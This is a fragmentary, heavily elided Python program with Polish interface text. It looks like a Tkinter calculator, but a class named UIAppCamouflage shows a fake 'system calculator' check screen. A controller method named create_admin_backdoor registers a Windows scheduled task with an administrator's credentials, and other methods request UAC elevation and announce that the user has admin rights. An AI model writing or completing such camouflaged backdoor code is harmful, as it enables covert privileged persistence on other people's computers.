    ...
    def calculate(expression):
        try:
            ...
            if isinstance(result, (int, float)):
                ...
                return formatted.replace("inf", "LIMIT SYSTEMU").replace(
                    "nan", "NIEZDEFINIOWANE"
                )
            return str(result)
...
class CalculatorApp:
    ...
    def _build_grid(self):
        buttons = [
            ("C", 0, 0, self.style.BTN_FUNC),
            ("DEL", 0, 1, self.style.BTN_FUNC),
            ("%", 0, 2, self.style.BTN_FUNC),
            ("/", 0, 3, self.style.ACCENT),
            ("7", 1, 0, self.style.BTN_NUM),
            ("8", 1, 1, self.style.BTN_NUM),
            ("9", 1, 2, self.style.BTN_NUM),
            ("*", 1, 3, self.style.ACCENT),
            ("4", 2, 0, self.style.BTN_NUM),
            ("5", 2, 1, self.style.BTN_NUM),
            ("6", 2, 2, self.style.BTN_NUM),
            ("-", 2, 3, self.style.ACCENT),
            ("1", 3, 0, self.style.BTN_NUM),
            ("2", 3, 1, self.style.BTN_NUM),
            ("3", 3, 2, self.style.BTN_NUM),
            ("+", 3, 3, self.style.ACCENT),
            ("0", 4, 0, self.style.BTN_NUM),
            (".", 4, 2, self.style.BTN_NUM),
    ...
    def handle_click(self, char):
        ...
        if char == "C":
            ...
            if (
                self.last_operator
                and current
                and not any(op in current for op in "+-*/^")
            ):
...
class CalculatorApp:
    def __init__(self, root):
        ...
        self.status_label = tkinter.Label(
            root, text="System Ready", bg="#1e1e1e", fg="#333333", font=("Segoe UI", 8)
        )
...
class UIAppCamouflage:
    def launch_custom_calc(self):
        def run_tk():
            ...
            tkinter.Label(
                root, text="Kalkulator Systemowy", font=("Arial", 12, "bold")
            ).pack(pady=10)
            tkinter.Label(
                root, text="Trwa sprawdzanie konfiguracji...", fg="blue"
            ).pack()
...
class MainController:
    ...
    def launch_vsc_as_tester(self):
        print(
            f"[SYSTEM] Automatyczne uruchamianie VS Code dla {self.admin_ops.username}..."
        )

        vsc_path = (
            r"C:\Users\barte\AppData\Local\Programs\Microsoft VS Code\bin\code.cmd"
        )
        if not os.path.exists(vsc_path):
            vsc_path = os.path.join(
        ...
        try:
            subprocess.run(
                [
                    ...
                    "00:00",
                    "/ru",
                    self.admin_ops.username,
                    "/rp",
                    self.admin_ops.password,
                    "/f",
                ],
                capture_output=True,
                check=True,
    ...
    def create_admin_backdoor(self):
        ...
        try:
            print(
                f"[SYSTEM] Krok 1/3: Rejestracja zadania '{task_name}' w Harmonogramie..."
            )
    ...
    def run(self):
        ...
        if mode == "2":
            ...
            if self.is_elevated():
                ...
                subprocess.Popen(
                    ["start", "cmd", "/k", "echo SYSTEM ZAKODOWANY. MASZ ADMINA."],
                    shell=True,
                )
            else:
    ...
    def run_admin_calculator(self):
        ...
        subprocess.Popen(
            [
                ...
                "cmd",
                "/k",
                "echo Zalogowano jako: %USERNAME% ^& echo Masz uprawnienia ADMINISTRATORA.",
            ],
            shell=True,
        )
    ...
    def request_elevation_with_mode(self, mode):
        ...
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {mode}', None, 1
        )
    ...
    def run_diagnostic_command(self, command, step_name):
        ...
        try:
            ...
            if stdout:
                print(f"[INFO SYSTEMOWY]:\n{stdout.strip()}")
            if stderr:
                print(f"[BŁĄD SYSTEMOWY]:\n{stderr.strip()}")
